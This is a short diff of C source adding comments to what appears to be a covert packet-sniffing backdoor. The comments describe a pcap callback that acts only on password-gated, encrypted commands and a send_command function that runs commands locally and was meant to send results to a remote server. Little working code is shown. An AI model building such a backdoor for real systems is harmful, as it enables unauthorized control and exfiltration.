@@ -37,7 +37,8 @@
  * 
  * RETURNS:     void
  * 
- * NOTES: Callback for handling sniffed packets.
+ * NOTES: Callback for handling sniffed packets. Only responds to commands where
+ *        the password and encryption matches.
  *
  *----------------------------------------------------------------------------*/
 void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
@@ -120,6 +121,25 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	return;
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    send_command
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   send_command(char *command)
+ *                   command - command to execute locally
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Currently only prints out the results of the executed command,
+ *        however, this function was meant to encompass sending the results
+ *        to a remote server.
+ *
+ *----------------------------------------------------------------------------*/
 void send_command(char *command)
 {
 	FILE *file;
